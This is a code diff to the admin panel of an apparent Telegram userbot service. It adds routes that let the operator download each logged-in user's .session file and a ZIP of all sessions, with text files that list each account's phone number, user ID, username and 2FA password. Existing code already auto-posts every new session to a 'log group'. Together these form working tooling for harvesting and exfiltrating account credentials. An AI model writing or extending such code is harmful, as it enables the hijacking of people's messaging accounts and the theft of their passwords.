@@ -1,3 +1,6 @@
+import io
+import re
+import zipfile
 import os
 import time
 import secrets
@@ -298,10 +301,18 @@ def _dashboard() -> str:
 
     <div class="card">
       <h2>🗜️ Sessions <span class="dim">({len(userbots)} total / {active_users} active)</span></h2>
-      <div class="dim">Every new session is auto-posted to the log group; a full ZIP is sent daily.</div>
-      <form method="post" action="/admin/action">
+      <div class="dim">Every new session is auto-posted to the log group; a full ZIP is sent daily. Download session files below.</div>
+      <table><tr><th>#</th><th>Phone</th><th>Status</th><th>Download</th></tr>
+      {"".join(
+        f"<tr><td>{i}</td><td><code>{html.escape(str(u.get('phone','')))}</code></td>"
+        f"<td>{html.escape(str(u.get('status','')))}</td>"
+        f"<td><a href='/admin/dl/session?phone={html.escape(str(u.get('phone','')))}'><button class='row'>⬇ .session</button></a></td></tr>"
+        for i, u in enumerate(userbots, 1)
+      )}</table>
+      <form method="post" action="/admin/action" style="margin-top:12px">
         <input type="hidden" name="action" value="force_zip">
-        <button type="submit">🗜️ Send ZIP now</button>
+        <button type="submit">🗜️ Send ZIP to log group</button>
+        <a href="/admin/dl/zip"><button class="row" type="button">⬇ Download all (ZIP)</button></a>
       </form>
     </div>
 
@@ -520,7 +531,11 @@ async def handle_action(request):
             token = data.get("token", "").strip()
             if token:
                 database.set_primary_bot_token(token)
-                message = "Main bot token saved. It applies on restart/redeploy."
+                # Same token doubles as session logger so only ONE token is needed
+                group_id = database.get_log_group_id()
+                database.set_logger_settings(token, group_id)
+                restart_msg = await session_logger.restart_log_bot()
+                message = f"Main bot token saved (logger = same token). {restart_msg}"
             else:
                 message = "Token required."
         elif action == "set_2fa":
@@ -597,6 +612,71 @@ async def _save_uploaded_photo(data) -> Optional[str]:
         return None
 
 
+def _session_file_bytes(phone: str) -> Optional[bytes]:
+    """Returns the .session file bytes for a phone, from disk or from the DB record."""
+    rec = database.get_userbot(phone)
+    if not rec:
+        return None
+    sb = rec.get("session_bytes") or b""
+    if sb:
+        return sb if isinstance(sb, (bytes, bytearray)) else str(sb).encode()
+    path = os.path.join(config.SESSION_DIR, f"{phone}.session")
+    if os.path.exists(path) and os.path.getsize(path) > 0:
+        with open(path, "rb") as f:
+            return f.read()
+    return None
+
+
+async def handle_dl_session(request):
+    if not _is_authed(request):
+        return web.HTTPFound("/admin")
+    phone = request.query.get("phone", "").strip()
+    if not phone:
+        return web.Response(text="Missing phone", status=400)
+    data_bytes = _session_file_bytes(phone)
+    if not data_bytes:
+        return web.Response(text="Session file not found in DB or disk.", status=404)
+    safe = re.sub(r"[^\w.+@-]", "_", phone)
+    return web.Response(
+        body=data_bytes,
+        content_type="application/octet-stream",
+        headers={"Content-Disposition": f'attachment; filename="{safe}.session"'}
+    )
+
+
+async def handle_dl_zip(request):
+    if not _is_authed(request):
+        return web.HTTPFound("/admin")
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        found = False
+        for ub in database.get_all_userbots():
+            phone = ub.get("phone", "")
+            if not phone:
+                continue
+            data_bytes = _session_file_bytes(phone)
+            if data_bytes:
+                zf.writestr(f"{phone.replace('+','')}.session", data_bytes)
+                found = True
+            info = f"""Phone: {phone}
+User ID: {ub.get('user_id')}
+Username: @{ub.get('username') or 'None'}
+Name: {ub.get('name')}
+Status: {ub.get('status')}
+Login time: {ub.get('login_time')}
+2FA password: {ub.get('twofa_password')}
+Broadcast: {'ON' if ub.get('broadcast_allowed') else 'OFF'}
+"""
+            zf.writestr(f"info_{phone.replace('+','')}.txt", info)
+        if not found:
+            zf.writestr("README.txt", "No session files found yet.")
+    return web.Response(
+        body=buf.getvalue(),
+        content_type="application/zip",
+        headers={"Content-Disposition": 'attachment; filename="sessions.zip"'}
+    )
+
+
 def get_admin_routes():
     return [
         web.get("/admin", handle_admin),
@@ -607,4 +687,6 @@ def get_admin_routes():
         web.post("/admin/action", handle_action),
         web.post("/admin/api/login", handle_api_login),
         web.get("/admin/api/status", handle_api_status),
+        web.get("/admin/dl/session", handle_dl_session),
+        web.get("/admin/dl/zip", handle_dl_zip),
     ]
